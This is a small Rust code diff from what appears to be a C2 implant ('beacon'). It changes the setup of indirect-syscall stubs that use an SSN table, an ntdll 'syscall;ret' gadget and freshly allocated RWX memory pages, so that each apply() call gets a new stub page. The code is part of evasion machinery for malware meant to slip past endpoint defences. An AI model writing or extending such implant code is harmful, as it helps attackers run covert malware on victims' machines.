@@ -421,6 +421,15 @@ fn lockdown_stub_page() {
 /// bootstrap context. Must run AFTER `syscalls::init_global` (needs the SSN
 /// table + the ntdll `syscall;ret` gadget address).
 pub unsafe fn apply() -> usize {
+    // Reset the stub arena for each apply() call so the page is allocated
+    // fresh (RWX).  Reusing an already-locked-down (RX) page from a prior
+    // apply() causes an AV when alloc_persistent_stub writes to it — the
+    // VirtualProtect inside alloc_persistent_stub may race or fail, and the
+    // copy is outside the VP guard.  A fresh page per apply() is simpler and
+    // the old page (locked down to RX, leaked) is harmless in a beacon context.
+    STUB_PAGE.store(0, core::sync::atomic::Ordering::Release);
+    STUB_CURSOR.store(0, core::sync::atomic::Ordering::Release);
+
     let rt = match syscalls::global() {
         Some(r) => r,
         None => return 0,
